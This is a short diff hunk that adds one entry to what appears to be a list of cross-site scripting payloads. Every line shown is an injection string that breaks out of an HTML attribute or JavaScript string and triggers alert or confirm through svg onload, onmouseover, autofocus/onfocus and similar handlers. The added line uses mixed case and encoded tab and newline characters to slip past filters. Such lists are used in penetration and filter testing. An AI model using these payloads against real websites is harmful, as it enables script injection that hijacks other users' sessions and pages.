@@ -17,6 +17,7 @@
 "><svg onload=alert(1)//
 "onmouseover=alert(1)//
 "autofocus/onfocus=alert(1)//
+"><deTaIlS%09onPoinTEReNTeR%0a=%0aconfirm()//
 '-alert(1)-'
 '-alert(1)//
 \'-alert(1)//
